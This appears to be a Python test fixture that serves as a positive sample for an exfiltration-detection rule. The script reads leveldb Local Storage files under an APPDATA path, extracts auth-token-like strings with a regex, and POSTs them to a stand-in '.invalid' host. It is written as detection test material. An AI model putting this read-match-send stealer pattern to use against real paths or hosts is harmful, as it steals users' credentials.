"""PHX-EXF-001 positive (ADR-028): tokens regex-extracted from a file under an env path,
collected into a list, and posted. The stealer shape: read, match, append, send.

The directory is under a variable no machine sets for this package, and the endpoint is
under .invalid.
"""
import json
import os
import re
import urllib.request

_base = os.getenv("APPDATA", "") + "/ExampleApp/Local Storage/leveldb"
_found = []
for _name in os.listdir(_base) if os.path.isdir(_base) else []:
    with open(os.path.join(_base, _name), errors="ignore") as fh:
        for _tok in re.findall(r"[A-Za-z0-9_-]{24}[.][A-Za-z0-9_-]{6}", fh.read()):
            _found.append(_tok)
_req = urllib.request.Request(
    "https://collector.example.invalid/hook",
    data=json.dumps({"content": "\n".join(_found)}).encode(),
)
urllib.request.urlopen(_req)
